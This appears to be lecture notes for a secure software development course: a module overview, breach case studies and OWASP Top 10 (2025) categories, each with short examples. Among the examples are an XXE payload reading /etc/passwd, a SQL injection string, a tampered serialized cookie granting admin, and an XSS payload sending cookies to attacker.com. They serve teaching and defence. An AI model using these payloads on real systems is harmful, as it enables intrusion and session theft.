# ICT2216 Secure Software Development
## Lecture 1: Module Overview & Secure Software Concepts (Part 1)

---

## Part 1 — Module Overview

### Teaching Team
- **First half:** Tram Truong Huu
- **Second half:** Raymond Chan
- **Labs:** Raymond Chan, Tram Truong Huu, Marcus Tan

### General Information
- **Lectures:** Every Thursday, 9 am – 11 am (Zoom)
- **Labs:** Every Thursday
  - P1: 1 pm – 3 pm
  - P2: 3 pm – 5 pm
  - Lab room: E2-07-14

---

### Why Study Secure Software Development?

Real-world examples of security failures:
- **Anthropic AI Coding Tools** — leaked its own source code twice in a year (packaging mistake, not a hack)
- **HSBC India** — required customers to enter passwords in UPPERCASE only, implying passwords may not be properly hashed (plaintext or reversible storage). This also reduces the effective password space by half.
- **Cisco** — ongoing security advisories for its Identity Services Engine

> Key insight: Security failures happen everywhere, even at major companies.

---

### Module Purpose

This module bridges **Information Security (IS)** and **Software Engineering (SE)** students:

| IS Students bring… | SE Students bring… |
|---|---|
| Ethical Hacking (ICT2212) | Software Engineering (INF2001) |
| Applied Cryptography (ICT2213) | HCI (INF2002) |
| Web Security (ICT2214) | Embedded Systems (ICT2004) |
| Mobile Security (ICT2215) | Mobile App Dev (ICT2007) |
| Network Security (ICT2217) | Software Design (ICT2112) |

**Both groups must work together on a shared project.**

---

### Why Take This Module?
- Learn from real-world security mistakes
- Develop a **security mindset** when designing applications
- Apply essential engineering principles to secure software development
- Understand the **Secure Development Life Cycle (SDLC)**, best practices, secure coding, and software quality

---

### Module Outline

Security is integrated into every phase of the SDLC:

1. **Secure Software Concepts**
2. **Secure Software Requirements** — Risk Evaluation Guideline & Requirements Criteria Doc
3. **Secure Software Design** — Security Design Review & Threat Modeling Guidelines
4. **Secure Software Implementation/Coding** — Security Coding Guide
5. **Secure Software Testing** — Security Testing Guideline
6. **Secure Software Deployment** — Vulnerability Management & Incident Response Guideline

---

### Schedule (TBC)

| S/No | Topic | Lectures (hrs) | Labs (hrs) |
|---|---|---|---|
| 1 | Secure Software Concepts | 2 | 2 |
| 2 | Secure Software Requirements | 2 | 2 |
| 3 | Secure Software Design | 5 | 5 |
| 4 | Secure Software Implementation/Coding | 8 | 8 |
| 5 | Secure Software Testing | 4 | 4 |
| 6 | Secure Software Deployment | 3 | 3 |
| | **Total** | **24** | **24** |

---

### Assessment

| Assessment Task | Weightage |
|---|---|
| One-page project proposal | 5% |
| Project Deliverable 1: Secure Software Requirements & Design | 20% |
| Project Deliverable 2: Secure Software Implementation | 25% |
| Project Deliverable 3: Secure Software Verification | 20% |
| Quizzes and Practical Test (Individual) | 30% |

**Individual assessments:**
- 1 Quiz — Week 6 (11 June 2026)
- 1 Practical Test — Week 12 (23 July 2026)

---

### Learning Outcomes

1. Recognise the need for security practices in different phases of a software development lifecycle
2. Model secure software requirements and threats with suitable UML diagrams
3. Apply appropriate security principles to secure software design
4. Implement secure software coding with reference to recommended best practices
5. Perform secure software verification using suitable tools and techniques

---

### Lab 1 Info
- Physical lab this afternoon
- Project details announced
- Form a team of **7–8 members** from the same lab group, mixing IS and SE students

---

### References
- *Secure Programming with Python* — Tamaghna Basu
- *Microsoft Security Development Lifecycle* — https://www.microsoft.com/en-us/securityengineering/sdl
- *Software Security: Building Security In* — Gary McGraw
- *Threat Modeling: Designing for Security* — Adam Shostack

---
---

## Part 2 — Secure Software Concepts

### Agenda
- Relationship between Software and Security
- Case Studies
- Software Vulnerabilities — OWASP Top 10
- Vulnerability Tracking — CVEs, NVD, CAPEC, MITRE ATT&CK
- Software Assurance Methodologies — BSIMM, OpenSAMM, Microsoft SDLC

---

### Relationship Between Software and Security

> "We have a firewall and IDS already — why do we need to consider security at the application layer?"

- Network-level controls (firewall, IDS) don't protect against **application-layer vulnerabilities**
- CIA Triad applies at every layer: **Confidentiality, Integrity, Availability**

---

### Case Studies

**X (Twitter):** Account security incident (details in slides)

**7Pay (Japan):**
- Mobile payment app linked to credit/debit cards via barcode
- **Problem:** Password reset allowed attacker to redirect reset link to *their own* email
- An attacker only needed the victim's **email, date of birth, and phone number** to take over an account
- App was shut down shortly after launch

**Gladinet CentreStack:** Vulnerability exploited in enterprise file-sharing platform

**Why do these happen?**
- Security not considered in the initial design phase
- Mistakes during development
- Insufficient time for security review before launch ("rush to production")
- Companies not transparent about how they handle user data

---

### Code Exercise

```c
int balance;

void decrease(int amount) {
    if (balance >= amount)
        balance = balance - amount;
    else
        printf("Insufficient funds\n");
}

void increase(int amount) {
    balance = balance + amount;
}
```

**Problems with this code:**
- `balance` is a global variable — no access control
- No bounds checking on `increase()` — integer overflow possible
- No thread safety (race condition vulnerability)
- No input validation on `amount` (negative values?)

---

### Software Vulnerabilities

Categories of software vulnerabilities:
1. Access Control Vulnerabilities
2. Data Storage Vulnerabilities
3. Buffer Overflow Vulnerabilities
4. Authentication, Authorisation, or Cryptographic Vulnerabilities
5. Validation Vulnerabilities

---

### OWASP Top 10 (2025)

> Reference: https://owasp.org/www-project-top-ten/

**Notable changes from 2021 → 2025:**
- A06:2021 Vulnerable & Outdated Components → **A03:2025 Software Supply Chain Failures**
- A07:2021 Identification & Authentication Failures → **A07:2025 Authentication Failures**
- A09:2021 Security Logging & Monitoring Failures → **A09:2025 Security Logging & Alerting Failures**
- A10:2021 SSRF → **A10:2025 Mishandling of Exceptional Conditions** *(new)*

---

#### A01:2025 — Broken Access Control

Attackers modify parameters to access unauthorised data or admin pages.

**Scenario 1:** SQL query uses unverified `acct` parameter:
```java
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery();
// Attacker visits: http://example.com/app/accountInfo?acct=notmyacct
```

**Scenario 2:** Force browsing to restricted pages:
```
http://example.com/app/admin_getappInfo  ← accessible without admin role?
```

**Case Study — Instagram:**
- Hacker triggered a password reset for a victim's account
- Requested a 6-digit recovery code
- Brute-forced all possible codes via POST requests
- Rate-limiting was applied by IP, but **not by account** — so rotating IPs bypassed the protection

---

#### A02:2025 — Security Misconfiguration

**Scenario 1:** Sample/demo applications left on production servers with default credentials → attacker logs in with defaults

**Scenario 2:** Directory listing enabled → attacker lists and downloads compiled Java classes, decompiles them, finds access control flaws

**Scenario 3:** Detailed stack traces returned to users → exposes vulnerable component versions

**Scenario 4:** Cloud storage left with default open sharing permissions → sensitive data exposed

**XML External Entities (XXE):**
```xml
<!-- Extract /etc/passwd -->
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- SSRF: probe internal network -->
<!ENTITY xxe SYSTEM "https://192.168.1.1/private">

<!-- DoS via infinite file -->
<!ENTITY xxe SYSTEM "file:///dev/random">
```

---

#### A03:2025 — Software Supply Chain Failures

- Ranked #1 in community survey (50% of respondents)
- Evolved from "Using Components with Known Vulnerabilities" (2013) to covering the entire supply chain

**Scenarios:**
1. A trusted vendor is compromised with malware — your systems are compromised on upgrade
2. A vendor is compromised to behave maliciously only under specific conditions
3. Components run with the same privileges as the application itself

**Real-world examples:**
- **SolarWinds (2019):** ~18,000 organisations compromised via a malicious update
- **Bybit (2025):** $1.5 billion stolen via supply chain attack in wallet software
- **Log4Shell (CVE-2021-44228):** Apache Log4j RCE zero-day, exploited for ransomware and cryptomining

---

#### A04:2025 — Cryptographic Failures

Key questions to ask:
- Is data transmitted in cleartext (HTTP, SMTP, FTP)?
- Are old/weak cryptographic algorithms in use?
- Are default or weak crypto keys used without rotation?
- Is TLS enforcement missing?
- Is server certificate validation missing?

**Discussion questions:**
- Is it safe to store an API key directly in source code? ❌
- Is it OK to store a plaintext password in a Dockerfile? ❌

**Scenario 1:** Database auto-encrypts credit card numbers, but decrypts on retrieval — SQL injection reads them in cleartext:
```sql
SELECT fld_user, fld_pwd, AES_DECRYPT(fld_encryptedpwd, 'key')
FROM users WHERE fld_id='1903'
```

**Scenario 2:** Site doesn't enforce TLS → attacker downgrades HTTPS → HTTP, intercepts session cookie, hijacks authenticated session

**Scenario 3:** Password database uses unsalted or fast hashes → rainbow table attack or GPU cracking exposes all passwords

---

#### A05:2025 — Injection (incl. XSS)

**SQL Injection:**
```java
// Vulnerable
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";

// Attack: ?id=' or '1'='1
```

**Cross-Site Scripting (XSS) — Three Forms:**
- **Reflected XSS:** Unvalidated user input included in HTML response
- **Stored XSS:** Unsanitised input stored and later displayed to other users
- **DOM XSS:** JavaScript dynamically includes attacker-controllable data

**XSS Example:**
```java
// Vulnerable code
page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";

// Attack payload in CC parameter:
// '><script>document.location='http://attacker.com/steal?foo='+document.cookie</script>'
```

---

#### A06:2025 — Insecure Design

- New category since 2021 — focuses on **design flaws**, not just implementation bugs
- Requires threat modeling, secure design patterns, and reference architectures ("Secure by Design")

**Scenario 1:** Credential recovery using "security questions" → prohibited by NIST 800-63b (questions can be known by others)

**Scenario 2:** Cinema chain allows group bookings without rate limits → attacker books 600 seats across all cinemas simultaneously, causing massive revenue loss

---

#### A07:2025 — Authentication Failures

**Scenario 1:** No protection against credential stuffing → attacker uses lists of known passwords to validate credentials

**Scenario 2:** Password rotation and complexity requirements encourage reuse of weak passwords → NIST 800-63 recommends stopping these practices; use MFA instead

**Scenario 3:** Session timeout not set properly → user closes browser tab on a public computer → attacker uses the same browser an hour later and is still authenticated

---

#### A08:2025 — Software and Data Integrity Failures

- New category since 2021
- Covers insecure CI/CD pipelines, missing integrity checks on updates, and insecure deserialization

**Scenario 1:** Home router firmware updates not verified with signatures → unsigned firmware is a growing attack target

**Scenario 2:** SolarWinds — nation-state attacked the update mechanism; 18,000+ organisations affected

**Insecure Deserialization:**
```
// Original PHP serialized cookie
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}

// Attacker modifies role to "admin"
a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

> **Discussion:** Do you regularly update your OS, IDE, and libraries? Why or why not?

---

#### A09:2025 — Security Logging & Alerting Failures

Insufficient logging occurs when:
- Logins, failed logins, and high-value transactions are not logged
- Warnings and errors produce no or unclear log messages
- Logs are not monitored for suspicious activity
- Logs are only stored locally
- No alerting thresholds or escalation processes
- Penetration testing/DAST scans don't trigger alerts
- Active attacks cannot be detected in real time

**Scenarios:**
1. Children's health plan provider — data breach undetected for **7+ years** (since 2013) due to no logging
2. Major Indian airline — breach involving 10+ years of passenger data discovered by a third-party cloud provider
3. European airline — 400,000+ customer payment records harvested; fined **£20 million** under GDPR

---

#### A10:2025 — Mishandling of Exceptional Conditions *(New in 2025)*

Focuses on improper error handling, logical errors, and "failing open."

**Related CWEs:**
- CWE-209: Error messages containing sensitive information
- CWE-234: Failure to handle missing parameters
- CWE-274: Improper handling of insufficient privileges
- CWE-476: NULL pointer dereference
- CWE-636: Not failing securely ("failing open")

**Scenarios:**
1. **DoS via resource exhaustion:** App catches file upload exceptions but doesn't release resources → locks up all resources
2. **Sensitive data exposure:** DB error messages returned to user → attacker uses the information to craft better SQL injection attacks
3. **Financial race condition:** Multi-step transaction (debit → credit → log) not rolled back on failure → attacker can drain account or send money multiple times

---

*End of Lecture 1*
